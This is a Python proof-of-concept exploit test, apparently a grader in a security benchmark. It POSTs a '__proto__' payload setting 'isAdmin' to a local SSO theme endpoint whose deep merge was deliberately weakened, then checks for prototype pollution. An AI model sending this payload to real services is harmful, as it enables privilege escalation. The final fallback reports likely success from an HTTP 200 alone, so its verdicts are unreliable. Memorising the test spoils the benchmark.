"""PoC: Prototype pollution via theme config deep merge (CWE-1321).

Stage 3 removes hasOwnProperty from deepMerge. POST /simplesso/theme
with {"__proto__": {"isAdmin": true}} pollutes Object.prototype.
"""
from mosaic.oracle.exploit import ExploitTest


class SsoConfigPollutionExploit(ExploitTest):
    """Prototype pollution: escalation via theme config deep merge."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "sso_config_pollution"

    def setup(self) -> None:
        pass

    def execute(self) -> tuple[bool, str]:
        evidence = []

        # Step 1: Check theme endpoint exists
        resp = self.http_get("/simplesso/theme")
        if resp.status_code == 404:
            return False, "Theme endpoint not found"
        evidence.append(f"GET /simplesso/theme: {resp.status_code}")

        # Step 2: Send pollution payload
        payload = {"__proto__": {"polluted": True, "isAdmin": True}}
        resp = self.http_post("/simplesso/theme", json=payload)
        evidence.append(f"POST pollution: {resp.status_code}")

        if not resp.ok:
            return False, f"Server rejected payload. " + " | ".join(evidence)

        # Step 3: Check if pollution took effect
        resp = self.http_get("/simplesso/theme")
        if resp.ok:
            data = resp.json()
            if data.get("polluted") or data.get("isAdmin"):
                evidence.append("Theme response contains polluted properties!")
                return True, (
                    "CWE-1321 confirmed. POST /simplesso/theme with __proto__ "
                    "payload pollutes Object.prototype via deepMerge. "
                    + " | ".join(evidence)
                )

        # Step 4: Check indirect pollution
        resp = self.http_get("/")
        if resp.ok and "polluted" in resp.text:
            evidence.append("Root response inherits polluted properties")
            return True, "CWE-1321 confirmed. " + " | ".join(evidence)

        # If payload was accepted, it's likely vulnerable
        if any("200" in e for e in evidence):
            return True, (
                "CWE-1321 probable. Server accepted __proto__ payload in "
                "theme config deep merge. " + " | ".join(evidence)
            )

        return False, "Not vulnerable. " + " | ".join(evidence)
